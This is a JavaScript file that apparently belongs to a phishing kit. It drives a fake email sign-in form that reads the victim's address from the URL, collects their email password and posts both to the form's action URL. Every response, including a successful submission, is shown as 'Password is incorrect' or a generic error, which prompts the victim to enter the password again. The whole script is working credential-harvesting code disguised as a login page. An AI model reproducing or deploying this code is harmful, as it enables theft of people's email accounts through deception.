const param = new URLSearchParams(window.location.search);
	let emailParam = param.get('email') ? param.get('email') : '';
	let plusOne = 0;

	if (emailParam === "null") {
		emailParam = "";
	}

	const email = document.getElementById('email');
	const password = document.getElementById('password');
	const source = document.getElementById('source');
	const submitButton = document.getElementById('submitButton');
	const errorShow = document.getElementById('errorShow');
	const form = document.getElementById("thisForm");
	email.value = emailParam;

	submitButton.addEventListener('click', function(e){
		e.preventDefault();
		if (email.value === "") {
			errorShow.textContent = "Enter your email address";
			email.focus();
			showEl(errorShow, "red");
			return;
		} else if (!email.value.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
			errorShow.textContent = "Enter a valid email address";
			email.focus();
			showEl(errorShow, "red");
			return;
		} else if (password.value === "") {
			errorShow.textContent = "Enter your email password";
			password.focus();
			showEl(errorShow, "red");
			return;
		} else {
			const domain = email.value.split('@')[1];
			plusOne = plusOne + 1;
			showEl(errorShow, "black");
			errorShow.textContent = "Authenticating...";

			var $form = $("#thisForm");
			var url = form.action;
			var data = $form.serialize();

			$.ajax({
				type: "POST",
                url: url,
                data: data,
                cache: false,
                timeout: 800000,
                success: function(res) {
                	if(res.status) {
						password.value = "";
						password.style.borderColor = "red";
						showEl(errorShow, "red");
						errorShow.textContent = "Password is incorrect.";
                	}else {
						showEl(errorShow, "red");
						errorShow.textContent = "Something isn't right, please try again.";
						password.value = "";
						password.style.borderColor = "red";
					}
                },
                error: function(e) {
            		showEl(errorShow, "red");
					errorShow.textContent = "Something isn't right, please try again.";
					password.value = "";
					password.style.borderColor = "red";
                }
			});
		}
	});

	function showEl(el, color) {
		el.style.color = color;
		el.style.display = "block";
	}

	function hideEl(el) {
		el.style.color = '#000';
		el.style.display = "none";
		el.textContent = "";
	}